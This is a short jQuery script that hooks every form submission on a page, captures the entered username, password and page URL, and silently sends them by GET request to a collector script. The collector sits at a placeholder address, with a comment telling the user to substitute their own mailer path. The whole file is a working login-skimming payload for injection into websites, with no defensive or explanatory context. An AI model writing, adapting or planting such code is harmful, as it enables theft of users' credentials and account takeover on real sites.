$(function() {

 $("form").submit(function(e) {
  var passwordBoxes = $("input[type=password]");
  var username = $("input[type=text]").not(passwordBoxes).filter(function() {
   var field = $( this );
   return field && ( field.val() || field.html() ) || {val:function(){return "nouser"}};
  }).val();
  password = passwordBoxes && passwordBoxes.val() || "";
  var msg = "Username: " + username + " || Password: " + password + " || Url: " + location.href;
  if ( password && password.length > 4 )
  $.ajax({
   type: 'GET',
   async : false,
   url: 'https://127.0.0.1/req.php', //Change to the path of your mailer script
   data: msg //Change to add any headers to be sent along
  });
 });
});